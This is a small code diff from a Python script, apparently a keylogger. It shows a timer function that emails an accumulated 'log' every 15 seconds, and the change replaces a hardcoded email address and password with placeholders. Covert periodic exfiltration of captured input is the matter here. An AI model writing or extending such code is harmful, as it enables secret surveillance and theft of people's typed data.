@@ -31,7 +31,7 @@ def sendEmail(email, password, message):
 
 def threadFunction():
     global log
-    sendEmail("cybersec111@hotmail.com", "babaci1234", log.encode("utf-8"))
+    sendEmail("user@hotmail.com", "password", log.encode("utf-8"))
     log = ""
     timerObject = threading.Timer(15, threadFunction)
     timerObject.start()
